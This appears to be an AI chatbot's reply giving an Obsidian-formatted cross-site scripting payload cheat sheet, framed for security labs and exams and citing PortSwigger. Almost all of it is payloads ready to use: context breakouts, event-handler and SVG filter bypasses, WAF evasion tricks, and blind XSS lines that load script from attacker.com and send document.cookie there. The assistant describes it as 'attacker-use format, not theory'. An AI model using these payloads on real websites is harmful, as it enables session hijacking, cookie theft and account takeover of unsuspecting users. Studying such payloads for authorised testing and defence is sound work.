Alright—this is going to be a **clean, Obsidian-ready XSS command/payload cheat sheet** based on PortSwigger-style content (payloads, contexts, bypasses, workflow). I’ve compressed it into **attacker-use format**, not theory.

---

```md
## 🧠 Cross-Site Scripting (XSS) Cheat Sheet

---

### 🎯 1. Basic Detection

```

">alert(1)

> [!CHECK]
> 
> - Is input reflected?
>     
> - Is output encoded?
>     
> - What context? (HTML / Attribute / JS)
>     

---

### 🧪 2. Context-Based Payloads

#### 🧱 HTML Context

```
<script>alert(1)</script>
```

```
<svg/onload=alert(1)>
```

#### 🧩 Attribute Context

```
" onmouseover="alert(1)
```

```
' onfocus=alert(1) autofocus '
```

#### ⚙️ JavaScript Context

```
';alert(1);//
```

```
";alert(1);//
```

> [!NOTE]  
> Payload depends on **context breakout** (HTML, attribute, JS)

---

### 🧬 3. Event-Based Payloads (Bypass Filters)

```
<img src=1 onerror=alert(1)>
```

```
<body onload=alert(1)>
```

```
<input onfocus=alert(1) autofocus>
```

```
<video oncanplay=alert(1)>
```

> [!ATTENTION]  
> Many WAFs block `<script>` but NOT event handlers ([PortSwigger](https://portswigger.net/research/one-xss-cheatsheet-to-rule-them-all?utm_source=chatgpt.com "One XSS cheatsheet to rule them all"))

---

### 🧪 4. SVG / Rare Tag Bypass

```
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
```

```
<svg/onload=alert(1)>
```

> [!NOTE]  
> SVG is a **common WAF bypass vector**

---

### 🧩 5. Filter Bypass Tricks

#### 🔹 Case / Encoding

```
<ScRiPt>alert(1)</ScRiPt>
```

```
%3Cscript%3Ealert(1)%3C/script%3E
```

#### 🔹 Broken Payload

```
<scr<script>ipt>alert(1)</script>
```

#### 🔹 HTML Entity

```
&lt;script&gt;alert(1)&lt;/script&gt;
```

> [!ATTENTION]  
> XSS cheat sheets focus heavily on **filter evasion techniques** ([PortSwigger](https://portswigger.net/research/one-xss-cheatsheet-to-rule-them-all?utm_source=chatgpt.com "One XSS cheatsheet to rule them all"))

---

### 💥 6. DOM-Based XSS Payloads

```
# URL fragment injection
#example.com/#<img src=x onerror=alert(1)>
```

```
javascript:alert(1)
```

> [!CHECK]
> 
> - Look for sinks:
>     
>     - `innerHTML`
>         
>     - `document.write`
>         
>     - `eval()`
>         

> [!NOTE]  
> DOM XSS happens when JS writes unsanitized input into DOM ([PortSwigger](https://portswigger.net/web-security/cross-site-scripting?utm_source=chatgpt.com "What is cross-site scripting (XSS) and how to prevent it?"))

---

### ⚙️ 7. WAF Bypass (Advanced)

#### 🔹 Animation Trick

```
<style>@keyframes x{}</style>
<b style="animation-name:x" onanimationstart="alert(1)"></b>
```

#### 🔹 Base64 Execution

```
<img src=x onerror=location=atob`YWxlcnQoMSk=`>
```

> [!ATTENTION]  
> These payloads bypass filters using **non-obvious execution paths**

---

### 🧪 8. Blind XSS Payload

```
<script src=https://attacker.com/xss.js></script>
```

```
<img src=x onerror=fetch('https://attacker.com/'+document.cookie)>
```

> [!SUCCESS]  
> Used when payload executes later (admin panel, logs)

---

### 🔍 9. Discovery Workflow (REAL METHOD)

> [!SUCCESS]

1. Inject test:
    

```
test123
```

2. Check reflection
    
3. Try basic payload:
    

```
<script>alert(1)</script>
```

4. If blocked → try:
    

```
<img src=x onerror=alert(1)>
```

5. If still blocked:
    

- Switch context
    
- Use event handlers
    
- Use SVG
    

6. Confirm execution
    

---

### 🧠 10. Where to Inject

> [!ABSTRACT]

- Search fields
    
- URL parameters
    
- Forms
    
- Headers
    
- JSON responses
    
- DOM sinks
    

---

### 🎯 11. Impact

> [!TLDR]

XSS allows attacker to:

- Steal cookies
    
- Hijack sessions
    
- Perform actions as user
    
- Inject malicious JS
    

✔ Full account takeover possible ([PortSwigger](https://portswigger.net/web-security/cross-site-scripting?utm_source=chatgpt.com "What is cross-site scripting (XSS) and how to prevent it?"))

---

## 🔥 Minimal Payload Set (EXAM USE)

```bash
# Basic
<script>alert(1)</script>

# Attribute
" onmouseover="alert(1)

# Event bypass
<img src=x onerror=alert(1)>

# SVG bypass
<svg/onload=alert(1)>

# JS context
';alert(1);//

# DOM XSS
javascript:alert(1)
```

---

## ⚠️ Operator Notes

> [!FAILURE]

If payload fails:

- Output encoded
    
- Wrong context
    
- CSP blocking
    
- Input sanitized
    

---

> [!ATTENTION]

XSS is **context dependent**

You must:

- Identify context
    
- Break out correctly
    
- Then execute payload
    

---

```

---

## 🔥 This is how to use it (real talk)

When you're in a lab:
- Start from **section 1 → 3**
- If blocked → jump to **event + SVG**
- If still blocked → use **bypass tricks**
- Always think: **“what context am I in?”**

---



Just say the word 🚀
::contentReference[oaicite:4]{index=4}
```